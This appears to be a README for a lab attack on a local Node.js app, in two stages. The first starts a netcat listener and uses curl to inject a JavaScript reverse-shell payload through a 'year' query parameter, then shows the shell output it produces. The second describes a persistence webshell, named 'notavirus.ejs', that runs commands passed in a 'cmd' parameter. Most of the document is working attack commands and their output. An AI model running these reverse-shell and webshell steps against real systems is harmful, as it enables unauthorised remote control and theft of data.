<h1 align="center">Initial Stage (revshell.js)</h2>

## Start a Netcat Listener
```
nc -lvnp 8000
```
Before performing the attack, the attacker machine must host a server which will listen for a [reverse tcp shell](https://www.acunetix.com/blog/web-security-zone/what-is-reverse-shell/). This example uses [openbsd-netcat](https://man.openbsd.org/nc.1)

## Injecting the payload
### Method 1
Copy the contents of the payload file.
```
# Windows
type payload\revshell.js | clip

# Linux
xclip -in payload/revshell.js -selection clipboard
```
And paste it at the vulnerable endpoint.
```
curl -G --data-urlencode "year=<payload>" http://localhost:3000
```
### Method 2
Host a server from the `payload` directory and use cURL to inject the payload
1. `php -S 0.0.0.0:5000` or `python -m http.server 5000`
2. `curl -G --data-urlencode "year=$(curl -s http://localhost:5000/revshell.js)" http://localhost:3000`

### Result
If successful the attacker machine receive a signal and output similar to what is shown below:
```
% nc -lnvp 8000
Listening on 0.0.0.0 8000
Connection received on 127.0.0.1 44598
$ ls
README.md
app.js
node_modules
package-lock.json
package.json
public
views
$
```

<h1 align="center">Persistence Stage (notavirus.ejs)</h2>

## How to use the payload

The payload will spawn a webshell which you can access from `http://localhost:8000`. You can specify commands by appending an HTTP GET query called `cmd`
```
1. curl -G --data-urlencode "cmd=<command>" http://localhost:8000
2. curl -G --data-urlencode "cmd=cat /etc/*-release" http://localhost:8000
3. (using the browser) http://localhost:8000/?cmd=cat /etc/*-release
```
